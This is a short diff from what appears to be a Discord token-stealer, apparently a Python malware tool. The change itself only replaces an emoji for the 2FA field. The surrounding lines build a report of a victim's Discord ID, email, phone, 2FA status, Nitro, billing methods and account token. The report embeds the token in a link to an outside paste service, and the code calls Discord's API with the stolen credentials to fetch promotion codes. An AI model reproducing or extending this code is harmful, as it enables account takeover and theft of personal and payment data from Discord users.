@@ -329,7 +329,7 @@ class Discord:
                 except TypeError:
                     methods += "❓"
 
-            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:1024717106996064296> `Email:` **{email}**\n:mobile_phone: `Phone:` **{phone}**\n\n<:2fa:1024718014278533212> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:1024718620896538787> `Billing:` **{methods}**\n\n<:crown1:1024719305482444851> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:1024717106996064296> `Email:` **{email}**\n:mobile_phone: `Phone:` **{phone}**\n\n🔒 `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:1024718620896538787> `Billing:` **{methods}**\n\n<:crown1:1024719305482444851> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
             g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
 
